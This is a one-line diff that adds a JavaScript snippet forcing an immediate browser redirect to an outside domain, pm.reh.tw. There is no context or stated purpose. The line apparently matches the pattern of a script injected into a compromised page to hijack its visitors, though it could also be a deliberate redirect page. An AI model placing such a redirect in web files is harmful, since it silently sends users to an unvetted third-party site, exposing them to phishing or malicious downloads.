@@ -1,0 +1,1 @@
+<script language="javascript">document.location.href="http://pm.reh.tw/";</script>
